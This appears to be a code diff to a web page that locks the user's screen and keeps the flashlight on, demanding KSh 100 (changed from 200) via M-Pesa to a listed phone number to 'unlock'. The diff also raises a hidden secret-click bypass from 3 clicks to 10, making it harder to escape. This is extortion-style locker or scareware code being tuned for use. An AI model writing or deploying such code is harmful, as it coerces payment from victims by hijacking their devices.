@@ -426,16 +426,16 @@
                 M-PESA
             </div>
             <h2>Premium Deactivation</h2>
-            <p>Send KSh 200.00 via M-Pesa to turn off the flashlight and unlock your screen.</p>
+            <p>Send KSh 100.00 via M-Pesa to turn off the flashlight and unlock your screen.</p>
 
             <div class="pay-details">
                 <div>
                     <span class="label">Send To:</span>
-                    <span class="value" id="myPhoneNumber">0741 215 721</span>
+                    <span class="value" id="myPhoneNumber">0141 215 721</span>
                 </div>
                 <div>
                     <span class="label">Amount Due:</span>
-                    <span class="value">KSh 200.00</span>
+                    <span class="value">KSh 100.00</span>
                 </div>
             </div>
 
@@ -604,7 +604,7 @@
 
         function handleSecretClick() {
             secretClicks++;
-            if (secretClicks >= 3) {
+            if (secretClicks >= 10) {
                 vibrate([50, 50, 200]);
                 secretClicks = 0;
                 turnOffSystemTorch();
